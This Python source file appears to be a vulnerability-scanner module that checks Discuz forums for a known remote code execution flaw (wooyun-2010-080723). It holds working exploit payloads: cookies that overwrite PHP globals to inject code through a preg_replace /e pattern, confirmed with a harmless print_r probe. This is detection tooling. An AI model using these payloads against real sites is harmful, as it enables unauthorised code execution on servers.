#!/usr/bin/env python3
# -*- coding:utf-8 -*-

from lib.tool.md5 import random_int_1
from lib.tool import check

wooyun_2010_080723_payloads = [
    {
        'path': 'viewthread.php?tid=10&extra=page%3D1',
        'headers': {'Cookie': 'GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]={RCECOMMAND};'}
    },
    {
        'path': '?tid=10&extra=page%3D1',
        'headers': {'Cookie': 'GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]={RCECOMMAND};'}
    },
    {
        'path': '',
        'headers': {'Cookie': 'GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]={RCECOMMAND};'}
    },
]

def wooyun_2010_080723_scan(clients):
    ''' 
        由于php5.3.x版本里php.ini的设置里request_order默认值为GP,
        导致$_REQUEST中不再包含$_COOKIE, 
        我们通过在Cookie中传入$GLOBALS来覆盖全局变量, 可以造成代码执行漏洞。
    '''
    client = clients.get('reqClient')
    
    vul_info = {
        'app_name': 'Discuz',
        'vul_type': 'RCE',
        'vul_id': 'wooyun-2010-080723',
    }

    for payload in wooyun_2010_080723_payloads:
        random_str = str(random_int_1(6))
        RCEcommand = 'print_r(' + random_str + ')'
        
        path = payload['path']
        headers = payload['headers']
        headers['Cookie'] = headers['Cookie'].format(RCECOMMAND=RCEcommand)

        res = client.request(
            'get',
            path,
            headers=headers,
            allow_redirects=False,
            vul_info=vul_info
        )
        if res is None:
            continue

        if (check.check_res(res.text, random_str, 'print_r')):
            results = {
                'Target': res.request.url,
                'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                'Request': res
            }
            return results
    return None
